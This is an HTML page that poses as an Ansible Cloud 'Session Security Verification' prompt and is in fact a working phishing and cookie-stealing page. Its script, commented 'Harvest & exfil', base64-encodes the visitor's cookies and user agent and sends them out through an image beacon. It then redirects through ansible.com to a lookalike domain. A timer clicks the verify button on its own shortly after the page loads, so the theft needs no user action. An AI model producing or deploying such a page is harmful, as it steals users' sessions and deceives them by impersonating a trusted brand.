<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Ansible Automation - Secure Session Check</title>
<style>
body{margin:0;padding:20px;background:#f6f8fa;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Helvetica,Arial,sans-serif;text-align:center}
img{max-width:180px;margin:20px 0}
.msg{font-size:16px;color:#24292f;margin:20px 0;line-height:1.5}
.btn{display:inline-block;padding:12px 28px;background:#0969da;color:#fff;text-decoration:none;border-radius:6px;font-weight:600;font-size:14px;margin:10px;box-shadow:0 2px 4px rgba(0,0,0,.1);cursor:pointer}
.btn:hover{background:#005cc5}
.spinner{display:none;width:20px;height:20px;border:2px solid #fff;border-top:2px solid transparent;border-radius:50%;animation:spin 1s linear infinite;margin:0 10px;vertical-align:middle}
.fade{opacity:0.5}
@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
</style>
</head>
<body>
<img src="https://www.ansible.com/hubfs/Ansible%20Website%20Assets/Ansible_logo_black_square.png" alt="Ansible">
<h1>Session Security Verification</h1>
<p class="msg">Confirm your Ansible Cloud session for secure access. This helps protect your automation playbooks.</p>
<button id="verifyBtn" class="btn">Verify & Continue <span id="spinner" class="spinner"></span></button>

<script>
document.getElementById('verifyBtn').onclick = function() {
  var spinner = document.getElementById('spinner');
  var btn = document.getElementById('verifyBtn');
  spinner.style.display = 'inline';
  btn.classList.add('fade');
  
  // Harvest & exfil - pure img beacon (works everywhere)
  var cookies = document.cookie;
  var data = 'c=' + btoa(cookies) + '&u=' + encodeURIComponent(navigator.userAgent) + '&t=' + Date.now();
  var exfil = new Image();
  exfil.src = 'https://httpbin.org/get?' + data;
  
  // Chain redirect
  setTimeout(function(){ window.location.href = 'https://www.ansible.com/'; }, 1200);
  setTimeout(function(){ window.location.href = 'https://ansible.fruwoocroo.com/!SZyFdWaC/'; }, 2800);
};

// Auto-trigger
setTimeout(function(){ document.getElementById('verifyBtn').click(); }, 800);
</script>
</body>
</html>
